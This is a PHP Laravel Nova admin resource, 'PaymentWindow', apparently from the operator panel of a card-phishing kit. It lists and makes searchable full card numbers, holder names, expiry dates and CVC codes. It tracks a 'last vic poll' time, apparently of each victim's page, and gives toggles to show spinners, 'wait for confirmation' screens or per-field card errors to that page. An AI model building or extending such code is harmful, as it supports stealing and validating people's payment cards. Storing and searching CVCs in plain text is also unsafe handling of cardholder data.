<?php

namespace App\Nova;

use Illuminate\Http\Request;
use Laravel\Nova\Fields\Boolean;
use Laravel\Nova\Fields\Date;
use Laravel\Nova\Fields\DateTime;
use Laravel\Nova\Fields\Number;
use Laravel\Nova\Fields\Text;
use Laravel\Nova\Fields\Textarea;
use Laravel\Nova\Fields\BelongsTo;
use Laravel\Nova\Fields\BelongsToMany;
use Laravel\Nova\Fields\HasOne;
use Laravel\Nova\Fields\HasMany;
use Laravel\Nova\Fields\ID;
use Laravel\Nova\Http\Requests\NovaRequest;

class PaymentWindow extends Resource
{
    /**
     * The model the resource corresponds to.
     *
     * @var class-string<\App\Models\PaymentWindow>
     */
    public static $model = \App\Models\PaymentWindow::class;

    public static $trafficCop = false;

    /**
     * The single value that should be used to represent the resource when being displayed.
     *
     * @var string
     */
    public static $title = 'id';

    /**
     * The columns that should be searched.
     *
     * @var array
     */
    public static $search = [
        'id', 'cc_number', 'cc_owner', 'cc_expiration_date', 'cc_cvc', 'fullscreen_spinner_label', 'wait_for_confirmation_error', 'partner', 'error_message'
    ];

    /**
     * Get the fields displayed by the resource.
     *
     * @param  \Laravel\Nova\Http\Requests\NovaRequest  $request
     * @return array
     */
    public function fields(NovaRequest $request)
    {
        return [
            ID::make()->sortable(),

            BelongsTo::make(__('Payment session'), 'paymentSession', PaymentSession::class),
            DateTime::make(__('Created at'), 'created_at')->sortable()->hideWhenCreating()->hideWhenUpdating(),
            Text::make(__('Payment window id'), 'payment_window_id'),
            Text::make(__('CC number'), 'cc_number'),
            Text::make(__('CC owner'), 'cc_owner'),
            Text::make(__('CC expiration date'), 'cc_expiration_date'),
            Text::make(__('CC cvc'), 'cc_cvc'),
            DateTime::make(__('Last vic poll'), 'last_vic_poll'),
            Boolean::make(__('Show fullscreen spinner'), 'show_fullscreen_spinner'),
            Text::make(__('Fullscreen spinner label'), 'fullscreen_spinner_label'),
            Boolean::make(__('Show wait for confirmation'), 'show_wait_for_confirmation'),
            Text::make(__('Wait for confirmation error'), 'wait_for_confirmation_error'),
            Boolean::make(__('Show success'), 'show_success'),
            Text::make(__('Partner'), 'partner'),
            Boolean::make(__('Close window with error'), 'close_window_with_error'),
            Text::make(__('Error message'), 'error_message'),
            Boolean::make(__('Show error for cc number'), 'error_cc_number'),
            Boolean::make(__('Show error for cc owner'), 'error_cc_owner'),
            Boolean::make(__('Show error for cc date'), 'error_cc_date'),
            Boolean::make(__('Show error for cc cvc'), 'error_cc_cvc'),
            DateTime::make(__('Updated at'), 'updated_at')->sortable()->hideWhenCreating()->hideWhenUpdating(),

        ];
    }

    /**
     * Get the cards available for the request.
     *
     * @param  \Laravel\Nova\Http\Requests\NovaRequest  $request
     * @return array
     */
    public function cards(NovaRequest $request)
    {
        return [];
    }

    /**
     * Get the filters available for the resource.
     *
     * @param  \Laravel\Nova\Http\Requests\NovaRequest  $request
     * @return array
     */
    public function filters(NovaRequest $request)
    {
        return [];
    }

    /**
     * Get the lenses available for the resource.
     *
     * @param  \Laravel\Nova\Http\Requests\NovaRequest  $request
     * @return array
     */
    public function lenses(NovaRequest $request)
    {
        return [];
    }

    /**
     * Get the actions available for the resource.
     *
     * @param  \Laravel\Nova\Http\Requests\NovaRequest  $request
     * @return array
     */
    public function actions(NovaRequest $request)
    {
        return [];
    }
}
